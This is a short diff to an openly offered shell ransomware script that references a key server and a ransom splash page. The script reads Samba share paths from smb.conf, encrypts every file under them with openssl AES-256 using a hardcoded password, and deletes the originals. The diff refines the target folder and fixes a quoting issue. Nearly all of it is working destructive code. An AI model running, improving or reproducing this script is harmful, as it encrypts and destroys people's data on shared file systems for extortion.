@@ -7,7 +7,7 @@ keyServer="https://secure.www-ssl.co"
 splashLocation="https://raw.githubusercontent.com/absane/Tricks/master/ransom/ransomware_splash.html"
 
 # Folder to encrypt
-targetFolder="/share"
+targetFolder="/shares"
 
 # Samba folders only. Set to False to target only $targetFolder
 smb="True"
@@ -19,7 +19,7 @@ if [ $smb == "True" ]
 then
 	for i in $(cat /etc/samba/smb.conf | grep path | cut -d ' ' -f3-99);
 	do
-		find -L $i -type f -exec openssl enc -pass pass:password -aes256 -in '{}' -out {}.enc \; -exec rm -f '{}' \;
+		find -L "$i" -type f -exec openssl enc -pass pass:password -aes256 -in '{}' -out {}.enc \; -exec rm -f '{}' \;
 	done
 else
 	find -L $targetFolder -type f -exec openssl enc -pass pass:password -aes256 -in '{}' -out {}.enc \; -exec rm -f '{}' \;
